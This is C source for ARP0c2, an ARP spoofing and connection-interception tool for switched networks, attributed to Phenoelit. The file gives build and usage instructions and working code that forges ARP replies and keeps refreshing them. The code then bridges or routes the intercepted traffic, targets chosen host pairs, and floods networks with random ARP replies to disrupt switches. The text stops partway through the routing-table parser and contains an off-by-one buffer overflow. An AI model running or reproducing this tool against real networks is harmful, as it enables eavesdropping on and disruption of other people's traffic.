/* ARP0c2.c
 *
 * ARP redirector / IP bridge
 * rewrite from the scratch
 *
 * FX <fx@phenoelit.de>
 * Phenoelit (http://www.phenoelit.de)
 * (c) 2k
 *
 * $Id: ARP0c2.c,v 1.13 2000/06/25 16:53:44 fx Exp fx $
 *
 * ARP0c2 is a simple connection interceptor for switched networks.
 * + ARP redirection/spoofing
 * + automated bridging
 * + automated routing 
 * + progressive attacks of known IP connections
 * + network cleanup on exit
 * + ARP flooding with random IP and Ethernet addresses
 *
 * The program is completely userland. No modifications on the host system 
 * needed.
 * 
 * Details:
 * ARP requests are replyed by ARP0c with it's onw Ethernet address. The real
 * destination is requested with ARP requests or is discovered from other
 * broadcasst traffic.
 * Intercepted traffic is bridged to the next hop gateway or the destination
 * address according to a routing table. 
 * Known connections can be intercepted in an agressive way by supplying these
 * in a file.
 *
 * Building on Linux with libpcap:
 * 	gcc -o ARP0c2 ARP0c2.c -lpcap
 *
 * Usage:
 * 	./ARP0c [-v[v[v]]] -i <interface>
 *
 * To use a routing table, supply this in TAB seperated order in a external 
 * file:
 * <network>	<netmask>	<gateway>
 * <network2>	<netmask2>	<gateway2>
 * Example:
 * 192.168.2.0	255.255.255.0	192.168.1.1
 * 0.0.0.0	0.0.0.0		192.168.1.254
 *
 * 	./ARP0c [-v[v[v]]] -i <interface> -r <route_file.txt>
 *
 * To intercept known connections, supply these in a seperate file. One 
 * connection per line.
 * <host1>	<host2>
 * Example:
 * 192.168.1.1	192.168.1.2
 *
 * 	./ARP0c [-v[v[v]]] -i <interface> -r <route_file.txt> -a <connect.txt>
 *
 * To flood a network (and it's switches) with random ARP replys, use:
 *
 * 	./ARP0c [-v[v[v]]] -i <interface> -f
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <netdb.h>                      /* for gethostbyname() */
#include <arpa/inet.h>                  /* for inet_ntoa() */
#include <sys/socket.h>                 /* for inet_ntoa() */
#include <sys/utsname.h>                /* for uname() */
#include <sys/ioctl.h>
#include <netinet/in.h>                 /* for IPPROTO_bla consts */
#include <netpacket/packet.h>
#include <net/ethernet.h>               /* to get my own ETH addr */
#include <net/if.h>

#include <pcap.h>
#include <net/bpf.h>

/* definitions */
#define MAX_INTERCEPTS	2000
#define MAX_ROUTES	32
#define MAX_AGRESSIVE	64

#define REFRESH_DELAY	5		/* delay between refreshs */
#define REFRESH_INITIAL	5		/* number of initial refreshs */
#define REFRESH_CHECKS	1		/* seconds between checks */
#define CAPLENGTH	1536		/* capture length */

/* all paket types which are of some interest for us */
#define PKTYPE_UNKNOWN		0
#define PKTYPE_ARP_REQUEST	1
#define PKTYPE_ARP_RESPONSE	2
#define PKTYPE_ETHER_BCAST	3
#define PKTYPE_IP_BCAST		4
#define PKTYPE_IP		5
#define PKTYPE_IP_THISHOST	6
#define PKTYPE_IP_ORIG		7
#define PKTYPE_WINDOZE_IP_TEST	8
#define PKTYPE_ARP_THISHOST	9
#define PKTYPE_ARP_FAKE		10

/* types ...
 * .. for ARP entries ... */
typedef struct {
    struct ether_addr	eth;
    struct in_addr	ip;
} arptable_t;

/* ... for refresh entries ...  */
typedef struct {
    struct ether_addr	eth;		/* who asked (ethernet) */
    struct in_addr	requester_ip;	/* who asked (IP) */
    struct in_addr	requested_ip;	/* which IP was requested */
    time_t		t_check;	/* last refresh send */
    int			fresh_flag;	/* to signal a new entry */
} refreshtable_t;

/* ... and for routing */
typedef struct {
    bpf_u_int32		network;
    bpf_u_int32		netmask;
    struct in_addr	gateway;
} routingtable_t;

typedef struct {
    struct in_addr	host1,host2;
} agressivetable_t;

/* ARP header */
#define ARPOP_REQUEST   1               /* ARP request.  */
#define ARPOP_REPLY     2               /* ARP reply.  */
#define ARPOP_RREQUEST  3               /* RARP request.  */
#define ARPOP_RREPLY    4               /* RARP reply.  */
struct arphdr {
    unsigned short int ar_hrd;          /* Format of hardware address.  */
    unsigned short int ar_pro;          /* Format of protocol address.  */
    unsigned char ar_hln;               /* Length of hardware address.  */
    unsigned char ar_pln;               /* Length of protocol address.  */
    unsigned short int ar_op;           /* ARP opcode (command).  */
    unsigned char __ar_sha[ETH_ALEN];   /* Sender hardware address.  */
    unsigned char __ar_sip[4];          /* Sender IP address.  */
    unsigned char __ar_tha[ETH_ALEN];   /* Target hardware address.  */
    unsigned char __ar_tip[4];          /* Target IP address.  */
};

#define IP_ADDR_LEN		(sizeof(struct in_addr))
/* IP header */
struct iphdr {
        u_char  ihl:4,        /* header length */
        version:4;              /* version */
        u_char  tos;          /* type of service */
        short   tot_len;      /* total length */
        u_short id;           /* identification */
        short   off;          /* fragment offset field */
        u_char  ttl;          /* time to live */
        u_char  protocol;     /* protocol */
        u_short check;        /* checksum */
        struct  in_addr saddr;
        struct  in_addr daddr;  /* source and dest address */
};

/***************************************************
 * Variables 
 ***************************************************/

/* the tables:
 *  + ARP table
 *  + Refresh table
 *  + Routing table
 *  + Agressive table 
 *  ... and the corresponding counter 
 */
arptable_t		arps[MAX_INTERCEPTS];
refreshtable_t		refs[MAX_INTERCEPTS];
routingtable_t		routes[MAX_ROUTES];
agressivetable_t	agr[MAX_AGRESSIVE];
int			arpc, refc, routc, agrc;

/* skeleton packets */
u_char			pkt_arp_request[(
	sizeof(struct ether_header)+sizeof(struct arphdr))];
u_char			pkt_arp_response[(
	sizeof(struct ether_header)+sizeof(struct arphdr))];

/* configuration used */
struct {
    char		*device;	/* network device name */
    int			verbose;	/* verbosity */
    int			routing;	/* routing enabled <yes/no> */
    int			agressive;	/* agressive interception startup */
    int			arpflood;	/* use ARP flooding */
} cfg;

int			stop_flag=0;	/* signals requested termination */
int			atsock;		/* RAW socket for sending packets */
pcap_t			*cap;		/* pcap handle */
struct in_addr		local_bcast;	/* broadcast address of our interface */
int			agressive_goflag=0;	/* agressive mode can start */

/*********************************************
 * Prototypes
 *********************************************/
void 	*smalloc(size_t size);
/* Network related */
int	initialize_socket(void);
int	identify_ethernet_frame(u_char *frame, int frame_length);
int	send_ethernet_frame(u_char *frame, int frame_length);
/* ARP table management */
int	arp_add_entry(struct ether_addr *ethadr, struct in_addr *ipadr);
struct ether_addr	*arp_find_entry(struct in_addr *ipadr);
/* ARP attack functions */
int	arp_build_skeletons(void);
int	arp_request(struct in_addr *ip);
int	arp_respond(
	struct ether_addr *sha, struct in_addr *sip, struct in_addr *tip);
int	arp_refresh(void);
int	arp_rehonnest(void);
void	arp_agressive_request(void);
int	agressive_read(char *filename);
void 	arp_agressive_intercept(void);
void	arp_flood(void);
/* routing and bridging related */
int	routing_read_table(char *filename);
struct in_addr	*routing_find_gateway(struct in_addr *dip);
void	bridge_packet(u_char *frame, int frame_length);
/* sniffer functions */
int	initialize_pcap(void);
/* signal handler */
void	sighandler(int sig);
/* alarm handler */
void	alarmhandler(int sig);
/* additional stuff */
void	usage(char *called);
void 	print_tables(void);

/* MACROS */
#define PRINTERR(x)	{ fprintf(stderr,"**ERROR**\n%s",x); }
#define VERBOSE(lev,msg)	{ if (cfg.verbose>=(lev)) { printf("%s",msg); }}

/********************************************/
int main(int argc, char **argv) {

    u_char		*pcap_data, *packet;
    struct pcap_pkthdr	*pcap_head, phead;
    int			packet_type;

    struct iphdr	*iph;
    struct arphdr	*arph;
    struct ether_header	*ethh;

    char		option;
    extern char 	*optarg;

    /* clear the tables */
    memset(&arps,0,sizeof(arps));
    memset(&refs,0,sizeof(refs));
    memset(&routes,0,sizeof(routes));
    memset(&agr,0,sizeof(agr));
    agrc=arpc=routc=refc=0;

    memset(&cfg,0,sizeof(cfg));
    while ((option=getopt(argc,argv,"vfi:r:a:"))!=EOF) {
	switch (option) {
	    case 'v':	/* verbosity */
			cfg.verbose++;
			break;
	    case 'i':	/* interface, required */
			cfg.device=smalloc(strlen(optarg));
			strcpy(cfg.device,optarg);
			break;
	    case 'r':	/* routing table file */
			if (routing_read_table(optarg)!=0) 
			    return (1);
			break;
	    case 'a':	/* agressive startup */
			agressive_read(optarg);
			cfg.agressive++;
			break;
	    case 'f':	cfg.arpflood++;
			break;
	    default:	/* unknown option */
			usage(argv[0]);
	}
    }

    if (!cfg.device) usage(argv[0]);

    /* start initialization of tables, socket and sniffer */
    if (initialize_pcap()!=0) return 1;
    if (initialize_socket()!=0) return 1;
    arp_build_skeletons();

    /* reached only in 'normal' operation */
    if (cfg.verbose) print_tables();

    /* register signal handler */
    signal(SIGABRT,&sighandler);
    signal(SIGTERM,&sighandler);
    signal(SIGINT, &sighandler);
    signal(SIGHUP, &sighandler);	/* this one is for printing tables */

    /* if we are here to flood an ARP table, let's do it and don't care about
     * all the other stuff */
    if (cfg.arpflood) 
	arp_flood();

    signal(SIGALRM,&alarmhandler);	/* for regulary refreshes while sitting
					   in blocked pcap_next(..) */
    alarm(REFRESH_CHECKS);

    /* get mem for pcap's header structure */
    pcap_head=(struct pcap_pkthdr *)smalloc(sizeof(struct pcap_pkthdr));

    /* send out the ARP requests for all the hosts in the agressive list */
    if (cfg.agressive) arp_agressive_request();

    /********************
     * MAIN loop starts
     ********************/
    while (!stop_flag) {

	/* some times, pcap returns NULL */
	if ((pcap_data=(u_char *)pcap_next(cap,pcap_head))!=NULL) {

	    /* make a local copy of the data, 
	     * pcap will overwrite the buffer if needed */
	    memcpy(&phead,pcap_head,sizeof(struct pcap_pkthdr));
	    packet=(u_char *)smalloc(phead.caplen);
	    memcpy(packet,pcap_data,phead.caplen);

	    ethh=(struct ether_header *)packet;
	    arph=(struct arphdr *)(packet+sizeof(struct ether_header));
	    iph=(struct iphdr *)(packet+sizeof(struct ether_header));
	    

	    switch ((packet_type=
			identify_ethernet_frame(packet,phead.caplen))) {

		case PKTYPE_UNKNOWN:	/* we don't know it */
		    VERBOSE(3,"received an unknown packet type\n");
		    break;
		case PKTYPE_ARP_REQUEST:
		    VERBOSE(3,"ARP request received\n");
		    /* send the faked reply */
		    arp_respond(
			    (struct ether_addr *)&arph->__ar_sha,
			    (struct in_addr *)&arph->__ar_sip,
			    (struct in_addr *)arph->__ar_tip);
		    /* add the sender to out ARP list */
		    arp_add_entry(
			    (struct ether_addr *)&(arph->__ar_sha),
			    (struct in_addr *)&(arph->__ar_sip));
		    /* request the real target hw addr */
		    arp_request((struct in_addr *)&(arph->__ar_tip));
		    break;
		case PKTYPE_ARP_RESPONSE:
		    VERBOSE(3,"ARP response received\n");
		    arp_add_entry(
			    (struct ether_addr *)&(arph->__ar_sha),
			    (struct in_addr *)&(arph->__ar_sip));
		    break;
		case PKTYPE_ETHER_BCAST:
		    VERBOSE(3,"Ethernet broadcast received\n");
		    break;
		case PKTYPE_IP_BCAST:
		    VERBOSE(3,"IP broadcast received\n");
		    arp_add_entry(
			    (struct ether_addr *)&(ethh->ether_shost),
			    (struct in_addr *)&(iph->saddr));
		    break;
		case PKTYPE_IP:
		    VERBOSE(3,"Intercepted IP packet received\n");
		    bridge_packet(packet,phead.caplen);
		    break;
		case PKTYPE_IP_THISHOST:
		    VERBOSE(3,"IP packet from/to this host received\n");
		    break;
		case PKTYPE_ARP_THISHOST:
		    VERBOSE(3,"ARP request from this host received\n");
		    break;
		case PKTYPE_IP_ORIG:
		    VERBOSE(3,"Unintercepted IP packet received\n");
		    break;
		case PKTYPE_ARP_FAKE:
		    VERBOSE(3,"Fake ARP response packet from this host\n");
		    break;
		default:
		    VERBOSE(3,"packet identification failed\n");
	    }

	    /* at the end of it all, free local copy */
	    free(packet);

	} /* pcap_data NULL check */

    }
    /*---------
     * main loop ends 
     *---------*/

    free(pcap_head);
    arp_rehonnest();
    close(atsock);

    return 0;
}


/* returns an initialized pointer to a memory area 
 * or hard-exits on failure */
void 	*smalloc(size_t size) {
    void	*p;

    if ((p=malloc(size))==NULL) {
	PRINTERR("smalloc(): malloc failed\n");
	exit (-2);
    }
    memset(p,0,size);
    return p;
}


/* opens the raw socket,
 * RETURNS 0 on success or -1 on error */
int	initialize_socket(void) {
    struct ifreq	ifr;

    if ((atsock=socket(PF_INET, SOCK_PACKET, htons(ETH_P_ALL)))<0) {
	perror("socket()");
	PRINTERR("Could not get SOCK_PACKET socket\n");
	return (-1);
    }

    /* get IP addr */
    memset(&ifr,0,sizeof(ifr));
    strncpy(ifr.ifr_name, cfg.device, sizeof (ifr.ifr_name));
    if (ioctl(atsock, SIOCGIFADDR, &ifr) < 0 ) {
	perror("ioctl()");
	PRINTERR("Could not read our IP address\n");
	return (-1);
    }
    memcpy(&arps[0].ip.s_addr,
	    &(*(struct sockaddr_in *)&ifr.ifr_addr).sin_addr.s_addr,
	    IP_ADDR_LEN);
    /* get HW addr */
    memset(&ifr,0,sizeof(ifr));
    strncpy(ifr.ifr_name, cfg.device, sizeof (ifr.ifr_name));
    if (ioctl(atsock, SIOCGIFHWADDR, &ifr) < 0 ) {
	perror("ioctl()");
	PRINTERR("Could not read our HW address\n");
	return (-1);
    }
    memcpy(&arps[0].eth,&ifr.ifr_hwaddr.sa_data,ETH_ALEN);
    /* get bcast addr */
    memset(&ifr,0,sizeof(ifr));
    strncpy(ifr.ifr_name, cfg.device, sizeof (ifr.ifr_name));
    if (ioctl(atsock, SIOCGIFBRDADDR, &ifr) < 0 ) {
	perror("ioctl()");
	PRINTERR("Could not read our broadcast address\n");
	return (-1);
    }
    memcpy(&local_bcast.s_addr,
	    &(*(struct sockaddr_in *)&ifr.ifr_broadaddr).sin_addr.s_addr,
	    IP_ADDR_LEN);
    /* no we know exactly one ARP entry */
    arpc=1;

    return 0;	/* fine */
}


/* tries to identify an Ehternet frame
 * RETURNS one of PKTYPE_* */
int	identify_ethernet_frame(u_char *frame, int frame_length) {
    struct ether_header		*eth;
    struct iphdr		*ip;
    struct arphdr		*arp;
    u_char			eth_bcast[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    eth=(struct ether_header *)frame;

    if (ntohs(eth->ether_type)==ETHERTYPE_ARP) {

	/* it is an ARP packet */
	arp=(struct arphdr *)(frame+sizeof(struct ether_header));
	if (ntohs(arp->ar_op)==ARPOP_REQUEST) {
	    /* this is a request */

	    if (!memcmp(&(arp->__ar_sha),&(arps[0].eth),ETH_ALEN)) {
		/* it's me asking for ARP .. ups */
		return PKTYPE_ARP_THISHOST;
	    } else if (!memcmp(&(arp->__ar_sip),&(arp->__ar_tip),IP_ADDR_LEN)) {
		/* Windoze IP availability test */
		return PKTYPE_WINDOZE_IP_TEST;
	    } else {
		/* normal interceptable ARP request */
		return PKTYPE_ARP_REQUEST;
	    }
	} else if (ntohs(arp->ar_op)==ARPOP_REPLY) {
	    if (!memcmp(&(eth->ether_shost),&(arps[0].eth),ETH_ALEN)) {
		/* ARP response from tis host - guess it's a fake */
		return PKTYPE_ARP_FAKE;
	    } else {
		/* this is a response */
		return PKTYPE_ARP_RESPONSE;
	    }
	} else {
	    /* RARP not yet implemented */
	    printf("Unknown ARP operation\n");
	    return PKTYPE_UNKNOWN;
	}

    } else if (ntohs(eth->ether_type)==ETHERTYPE_IP) {

	/* at least it is IP */
	ip=(struct iphdr *)(frame+sizeof(struct ether_header));
	if (!memcmp(&(ip->daddr),&local_bcast,IP_ADDR_LEN)) {
	    /* it's a broadcast */
	    return PKTYPE_IP_BCAST;
	} else if (
		(!memcmp(&(ip->daddr),&(arps[0].ip),IP_ADDR_LEN)) 
		||(!memcmp(&(ip->saddr),&(arps[0].ip),IP_ADDR_LEN)) ) {
	    /* it's my host speeking on layer 3 */
	    return PKTYPE_IP_THISHOST;
	} else if (!(memcmp(&(eth->ether_shost),&(arps[0].eth),ETH_ALEN))) {
	    /* it's a packet send from me ... */
	    return PKTYPE_IP_THISHOST;
	} else if (
		(memcmp(eth->ether_dhost,&(arps[0].eth),ETH_ALEN))
		&&(memcmp(eth->ether_shost,&(arps[0].eth),ETH_ALEN)) ){
	    /* it's a normal IP packet not from or to me */
	    return PKTYPE_IP_ORIG;
	} else {
	    /* it must be an intercepted IP packet */
	    return PKTYPE_IP;
	}

    } else if (!memcmp(eth->ether_dhost,&eth_bcast,ETH_ALEN)) {
	/* some kind of ethernet broadcast - may be usefull */
	return PKTYPE_ETHER_BCAST;
    } else {
	/* this is strange */
	return PKTYPE_UNKNOWN;
    }
}


/* send's the ethernet frame,
 * RETURNS the number of octets send or -1 on error */
int	send_ethernet_frame(u_char *frame, int frame_length) {
    struct sockaddr	sa;
    int			sendBytes;

    memset(&sa,0,sizeof(sa));
    strncpy(sa.sa_data,cfg.device,sizeof(sa.sa_data));

    sendBytes=sendto(atsock,frame,frame_length,0,&sa,sizeof(sa));
    if (sendBytes<0) {
	perror("send_ethernet_frame(): sendto");
	return (-1);
    } else if (sendBytes<frame_length) {
	fprintf(stderr,"send_ethernet_frame(): "
		"WARNING: short send %d out off %d\n",sendBytes,frame_length);
    }

    return sendBytes;
}
    

/* ARP table management */

/* adds an entry to the local ARP table if not already in 
 * RETURNS: 0
 */
int	arp_add_entry(struct ether_addr *ethadr, struct in_addr *ipadr) {
    int		in_list_flag=0;
    int		i;

    /* return if maximum */
    if (arpc>=MAX_INTERCEPTS) return (-1);

    for (i=0;i<arpc;i++) {
	if (
		(!memcmp(ethadr,&(arps[i].eth),ETH_ALEN))
		&&(!memcmp(ipadr,&(arps[i].ip),IP_ADDR_LEN)) ){
	    in_list_flag++;
	    break;
	}
    }

    if (!in_list_flag) {
	memcpy(&(arps[arpc].eth),ethadr,ETH_ALEN);
	memcpy(&(arps[arpc].ip),ipadr,IP_ADDR_LEN);
	arpc++;

	if (cfg.verbose) {
	    printf("ARP entry added: %s %02X:%02X:%02X:%02X:%02X:%02X\n",
		    inet_ntoa(arps[arpc-1].ip),
		    arps[arpc-1].eth.ether_addr_octet[0],
		    arps[arpc-1].eth.ether_addr_octet[1],
		    arps[arpc-1].eth.ether_addr_octet[2],
		    arps[arpc-1].eth.ether_addr_octet[3],
		    arps[arpc-1].eth.ether_addr_octet[4],
		    arps[arpc-1].eth.ether_addr_octet[5]);
	}
    }

    return 0;
}


/* returns the eth addr for an IP address of NULL if not found */
struct ether_addr	*arp_find_entry(struct in_addr *ipadr) {
    int		i;

    for (i=0;i<arpc;i++) {
	if (!memcmp(ipadr,&(arps[i].ip),IP_ADDR_LEN)) {
		return &(arps[i].eth);
	}
    }

    return NULL;
}

/* builds the skeleton packets later used to issue ARP requests or replys 
 * RETURNS 0*/
int	arp_build_skeletons(void) {
    struct ether_header		*ethreq,*ethresp;
    struct arphdr		*arpreq,*arpresp;
    char			eth_bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    memset(&pkt_arp_response,0,sizeof(pkt_arp_response));
    memset(&pkt_arp_request,0,sizeof(pkt_arp_request));

    ethreq=(struct ether_header *)pkt_arp_request;
    ethresp=(struct ether_header *)pkt_arp_response;
    arpreq=(struct arphdr *)(pkt_arp_request+sizeof(struct ether_header));
    arpresp=(struct arphdr *)(pkt_arp_response+sizeof(struct ether_header));

    ethresp->ether_type= ethreq->ether_type = htons(ETHERTYPE_ARP);
    arpresp->ar_hrd= arpreq->ar_hrd= htons(1);
    arpresp->ar_pro= arpreq->ar_pro= htons(0x0800);
    arpresp->ar_hln= arpreq->ar_hln= 6;
    arpresp->ar_pln= arpreq->ar_pln= 4;

    /* on request, we are the sender and the destination is broadcast */
    arpreq->ar_op=htons(ARPOP_REQUEST);
    memcpy(&(ethreq->ether_shost),&(arps[0].eth),ETH_ALEN);
    memcpy(&(arpreq->__ar_sha),&(arps[0].eth),ETH_ALEN);
    memcpy(&(arpreq->__ar_sip),&(arps[0].ip),IP_ADDR_LEN);
    memcpy(&(ethreq->ether_dhost),&eth_bcast,ETH_ALEN);
    memset(&(arpreq->__ar_tha),0,ETH_ALEN);

    /* on response, the 'sender' hardware address is me, even on LLC, but the
     * IP is the requested */
    arpresp->ar_op=htons(ARPOP_REPLY);
    memcpy(&(arpresp->__ar_sha),&(arps[0].eth),ETH_ALEN);
    memcpy(&(ethresp->ether_shost),&(arps[0].eth),ETH_ALEN);

    return 0;
}


/* send out an ARP request 
 * RETURNS 0 */
int	arp_request(struct in_addr *ip) {
    struct arphdr		*arph;

    arph=(struct arphdr *)(pkt_arp_request+sizeof(struct ether_header));
    memcpy(&(arph->__ar_tip),ip,IP_ADDR_LEN);

    send_ethernet_frame(pkt_arp_request,sizeof(pkt_arp_request));
    return 0;
}

    
int	arp_respond(
	/* who (eth) asked,       asking IP,           requested IP */
	struct ether_addr *sha, struct in_addr *sip, struct in_addr *tip) {

    struct arphdr		*arph;
    struct ether_header		*ethh;
    int				i;
    int				in_list_flag=0;

    /* if refreshes are in the maximum, return now */
    if (refc>=MAX_INTERCEPTS) return (-1);

    arph=(struct arphdr *)(pkt_arp_response+sizeof(struct ether_header));
    ethh=(struct ether_header *)pkt_arp_response;

    memcpy(&(ethh->ether_dhost),sha,ETH_ALEN);
    memcpy(&(arph->__ar_tha),sha,ETH_ALEN);
    memcpy(&(arph->__ar_tip),sip,IP_ADDR_LEN);
    memcpy(&(arph->__ar_sip),tip,IP_ADDR_LEN);

    send_ethernet_frame(pkt_arp_response,sizeof(pkt_arp_response));

    if (cfg.verbose) {
	printf("ARP response send to %s ",inet_ntoa(*sip));
	printf("claiming to be %s\n",inet_ntoa(*tip));
    }

    /* look in the refresh list if we already have this combi */
    for (i=0;i<refc;i++) {
	if (
		(!memcmp(&(refs[i].eth),sha,ETH_ALEN))
		&&(!memcmp(&(refs[i].requester_ip),sip,IP_ADDR_LEN))
		&&(!memcmp(&(refs[i].requested_ip),tip,IP_ADDR_LEN)) ) {
	    refs[i].fresh_flag=0;
	    in_list_flag++;
	}
    }

    if (!in_list_flag) {
	/*add this connection to the refreshlist if new */
	memcpy(&(refs[refc].eth),sha,ETH_ALEN);
	memcpy(&(refs[refc].requester_ip),sip,IP_ADDR_LEN);
	memcpy(&(refs[refc].requested_ip),tip,IP_ADDR_LEN);
	refs[refc].t_check=time(NULL);
	refs[refc].fresh_flag=0;
	refc++;
    }

    return 0;
}


int	arp_refresh(void) {
    struct arphdr		*arph;
    struct ether_header		*ethh;
    int				i;

    arph=(struct arphdr *)(pkt_arp_response+sizeof(struct ether_header));
    ethh=(struct ether_header *)pkt_arp_response;

    for (i=0;i<refc;i++) {

	if ((refs[i].t_check+REFRESH_DELAY)<time(NULL)) {

	    if (cfg.verbose>2) 
		printf("REFRESH (time): to %s (%ld)\n",
			inet_ntoa(refs[i].requester_ip),time(NULL));

	    memcpy(&(ethh->ether_dhost),&(refs[i].eth),ETH_ALEN);
	    memcpy(&(arph->__ar_tha),&(refs[i].eth),ETH_ALEN);
	    memcpy(&(arph->__ar_tip),&(refs[i].requester_ip),IP_ADDR_LEN);
	    memcpy(&(arph->__ar_sip),&(refs[i].requested_ip),IP_ADDR_LEN);

	    send_ethernet_frame(pkt_arp_response,sizeof(pkt_arp_response));

	    refs[i].t_check=time(NULL);

	} else if (refs[i].fresh_flag<REFRESH_INITIAL) {

	    refs[i].fresh_flag++;

	    if (cfg.verbose>2) 
		printf("REFRESH (new): to %s\n",
			inet_ntoa(refs[i].requester_ip));

	    memcpy(&(ethh->ether_dhost),&(refs[i].eth),ETH_ALEN);
	    memcpy(&(arph->__ar_tha),&(refs[i].eth),ETH_ALEN);
	    memcpy(&(arph->__ar_tip),&(refs[i].requester_ip),IP_ADDR_LEN);
	    memcpy(&(arph->__ar_sip),&(refs[i].requested_ip),IP_ADDR_LEN);

	    send_ethernet_frame(pkt_arp_response,sizeof(pkt_arp_response));

	    refs[i].t_check=time(NULL);
	}
    }

    return 0;
}


/* on close, be honnest to the hosts and tell them what you know */
int	arp_rehonnest(void) {
    struct arphdr		*arph;
    struct ether_header		*ethh;
    struct ether_addr		*ea;
    int				i;

    arph=(struct arphdr *)(pkt_arp_response+sizeof(struct ether_header));
    ethh=(struct ether_header *)pkt_arp_response;

    if (cfg.verbose>1) 
	printf("Cleaning up the network ...\n");

    for (i=0;i<refc;i++) {

	if ((ea=arp_find_entry(&(refs[i].requested_ip)))!=NULL) {
	    memcpy(&(ethh->ether_dhost),&(refs[i].eth),ETH_ALEN);
	    memcpy(&(arph->__ar_tha),&(refs[i].eth),ETH_ALEN);
	    memcpy(&(arph->__ar_tip),&(refs[i].requester_ip),IP_ADDR_LEN);
	    memcpy(&(arph->__ar_sip),&(refs[i].requested_ip),IP_ADDR_LEN);
	    memcpy(&(arph->__ar_sha),ea,ETH_ALEN);

	    if (cfg.verbose>1) {
		printf("Telling %s ",inet_ntoa(refs[i].requester_ip));
		printf("that %s is at %02X:%02X:%02X:%02X:%02X:%02X\n",
			inet_ntoa(refs[i].requested_ip),
			ea->ether_addr_octet[0],
			ea->ether_addr_octet[1],
			ea->ether_addr_octet[2],
			ea->ether_addr_octet[3],
			ea->ether_addr_octet[4],
			ea->ether_addr_octet[5]);
	    }

	    send_ethernet_frame(pkt_arp_response,sizeof(pkt_arp_response));
	}
    }

    return 0;
}


void	arp_agressive_request(void) {
    int		i;

    for (i=0;i<agrc;i++) {
	arp_request(&(agr[i].host1));
	arp_request(&(agr[i].host2));
	if (cfg.verbose) {
	    printf("++ Agressive request: %20s\n",inet_ntoa(agr[i].host1));
	    printf("++ Agressive request: %20s\n",inet_ntoa(agr[i].host2));
	}
    }
    agressive_goflag=1;
}


/* reads the information later used for the agressive startup
 * Format like routing file 
 * RETURNS 0 on success or -1 on error */
int	agressive_read(char *filename) {
#define MAX_LINE_LENGTH	512
#define DELIMITER	'\t'
    FILE	*fd;
    char	*line,*lp;
    
    agrc=0;

    if ((fd=fopen(filename,"rt"))==NULL) {
	PRINTERR("Could not open agressive startup file\n");
	return (-1);
    }

    line=smalloc(MAX_LINE_LENGTH);
    while (fgets(line,MAX_LINE_LENGTH-1,fd)!=NULL) {
	/* comments are ignored */
	if (line[0]=='#') continue;

	if (agrc>=MAX_AGRESSIVE) continue;

	if ((lp=strchr(line,DELIMITER))==NULL) {
	    PRINTERR("Incomplete line in agressive attack file\n");
	    return (-1);
	}
	lp[0]='\0';
	lp++;

	if (inet_aton(line,(struct in_addr *)&(agr[agrc].host1))==0) {
	    PRINTERR("Incorrect entry in agressive attack file\n");
	    return (-1);
	}
	if (inet_aton(lp,(struct in_addr *)&(agr[agrc].host2))==0) {
	    PRINTERR("Incorrect entry in agressive attack file\n");
	    return (-1);
	}
	if ((++agrc)>MAX_AGRESSIVE) return (0);
    }

    fclose(fd);
    return 0;
}


/* starts the agressive interception */
void arp_agressive_intercept(void) {
    int			i;
    struct ether_addr	*ea,*ea2;

    if (cfg.verbose) 
	printf("++ Agressive interception ...\n");

    for (i=0;i<agrc;i++) {

	if ( 
		((ea=arp_find_entry(&(agr[i].host1)))!=NULL) 
		&&((ea2=arp_find_entry(&(agr[i].host2)))!=NULL) ) {

	    arp_respond(ea,&(agr[i].host1),&(agr[i].host2));
	    arp_respond(ea2,&(agr[i].host2),&(agr[i].host1));

	}
    }
    agressive_goflag=0;
}


/* arp flooding - does not return to the main program ! */
void arp_flood(void) {
#define FLOODS		8000
    int			i,j;
    struct ether_addr	ea;
    struct in_addr	ipa;
    char		ipaa[4];
    struct arphdr		*arph;
    struct ether_header		*ethh;


    srand((unsigned int)time(NULL));
    arph=(struct arphdr *)(pkt_arp_response+sizeof(struct ether_header));
    ethh=(struct ether_header *)pkt_arp_response;

    stop_flag=0;
    while (!stop_flag) {
	for (i=0;i<FLOODS;i++) {

	    /* random source */
	    for (j=0;j<ETH_ALEN;j++) 
		ea.ether_addr_octet[j]=1+(int) (255.0*rand()/(RAND_MAX+1.0));
	    for (j=0;j<IP_ADDR_LEN;j++)
		ipaa[j]=1+(int) (255.0*rand()/(RAND_MAX+1.0));

	    memcpy(&(ethh->ether_shost),&ea ,ETH_ALEN);
	    memcpy(&(arph->__ar_sip),&ipaa ,IP_ADDR_LEN);
	    memcpy(&(arph->__ar_sha),&ea ,ETH_ALEN);

	    /* random destination */
	    for (j=0;j<ETH_ALEN;j++) 
		ea.ether_addr_octet[j]=1+(int) (255.0*rand()/(RAND_MAX+1.0));
	    memcpy(&(ethh->ether_dhost),&ea,ETH_ALEN);
	    memcpy(&(arph->__ar_tha),&ea,ETH_ALEN);
	    memcpy(&(arph->__ar_tip),&ipaa,IP_ADDR_LEN);

	    if (cfg.verbose>1) {
		memcpy(&ipa,&ipaa,IP_ADDR_LEN);
		printf(" * * flood * * |"
			"%18s is at %02X:%02X:%02X:%02X:%02X:%02X\n",
			inet_ntoa(ipa),
			ea.ether_addr_octet[0],
			ea.ether_addr_octet[1],
			ea.ether_addr_octet[2],
			ea.ether_addr_octet[3],
			ea.ether_addr_octet[4],
			ea.ether_addr_octet[5]);
	    }

	    send_ethernet_frame(pkt_arp_response,sizeof(pkt_arp_response));
	}

	printf("Flooding complete\n");
	sleep(2);
    }

    close(atsock);

    exit(0);
}


/* routing related */
/* routing_read_table(..) reads a routing table form the file supplied as
 * filename and stores this table in routes[..]
 * file format:
 * <network>D<netmask>D<gateway>\n
 * where D is the DELIMITER defined here
 * NOTE: entry 0 in routes[..] is filled in by initialize_pcap() !
 * RETURNS: 0 on success or -1 on error */
int	routing_read_table(char *filename) {
#define MAX_LINE_LENGTH	512
#define DELIMITER	'\t'
    FILE	*fd;
    char	*line,*lp,*lp2;		/* string manipulation pointer */
    int		loc_routc=1;		/* local routc variable */

    if ((fd=fopen(filename,"rt"))==NULL) {
	PRINTERR("Could not open routing file\n");
	return (-1);
    }

    line=(char *)smalloc(MAX_LINE_LENGTH);
    while (fgets(line,MAX_LINE_LENGTH-1,fd)!=NULL) {
	/* comment's are ignored */
	if (line[0]=='#') continue;

	if (loc_routc>=MAX_ROUTES) continue;

	/* get network address */
	if ((lp=strchr(line,DELIMITER))==NULL) {
	    PRINTERR("incomplete line in routing table file\n");
	    return (-1);
	}
